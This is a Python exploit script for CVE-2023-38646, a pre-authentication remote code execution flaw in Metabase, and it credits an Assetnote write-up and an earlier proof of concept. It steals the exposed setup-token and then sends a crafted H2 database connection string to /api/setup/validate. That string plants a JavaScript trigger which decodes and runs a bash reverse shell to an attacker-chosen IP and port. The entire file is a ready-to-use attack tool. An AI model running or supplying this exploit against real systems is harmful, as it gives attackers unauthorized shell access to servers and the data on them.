import requests, time, re, base64, sys


def create_payload(local_ip, local_port):
	print("[+] Creating payload string")
	reverse_shell = f'bash -i >&/dev/tcp/{local_ip}/{local_port} 0>&1\n'.encode('utf-8')
	payload = base64.b64encode(reverse_shell).decode('utf-8')
	#print(payload)
	return payload


def get_setup_token():
	token_url = f"{url}/api/session/properties"

	response = requests.get(token_url)
	pattern = r'"setup-token":"([^"]+)"'
	match = re.search(pattern, response.text)
	return match


def exploit(setup_token, b64_payload):
	vuln_url = f"{url}/api/setup/validate"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "application/json", "Content-Type": "application/json", "Connection": "close"}
	

	payload = {"token":setup_token,"details":{"is_on_demand":False,"is_full_sync":False,"is_sample":False,"cache_ttl":None,"refingerprint":False,"auto_run_queries":True,"schedules":{},"details":{"db":f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{b64_payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x","advanced-options":False,"ssl":True},"name":"c0rnbread","engine":"h2"}}
	
	#print(payload)
	print(f"[+] Sending exploit to {vuln_url}")

	response = requests.post(vuln_url, headers=headers, json=payload)
	print(response.text)


if __name__ == "__main__":
	print('''
		   _______      ________    ___   ___ ___  ____       ____   ___    __ _  _     __  
  / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \     |___ \ / _ \  / /| || |   / /  
 | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____ __) | (_) |/ /_| || |_ / /_  
 | |      \ \/ / |  __|______/ /| | | |/ / |__ <______|__ < > _ <| '_ \__   _| '_ \ 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |     ___) | (_) | (_) | | | | (_) |
  \_____|   \/   |______|  |____|\___/____|____/     |____/ \___/ \___/  |_|  \___/ 
                                                                                    
   	author: c0rnbread
   	credits:
   		https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
   		https://raw.githubusercontent.com/kh4sh3i/CVE-2023-38646/main/CVE-2023-38646.py
                                                                                    \n''')

	if (len(sys.argv) < 3):
		print("Usage: python3 exploit.py <url> <local-ip> <local-port>")
		exit()

	url = sys.argv[1].strip()
	url = url[:-1] if url.endswith('/') else url
	
	local_ip = sys.argv[2].strip()
	local_port = sys.argv[3].strip()


	setup_token = get_setup_token()

	if setup_token:
	    token_value = setup_token.group(1)
	    print("[+] Found setup-token! ", token_value)
	    time.sleep(1)
	else:
	    print("Host not vulnerable")
	    exit()

	b64_payload = create_payload(local_ip, local_port)

	exploit(token_value, b64_payload)





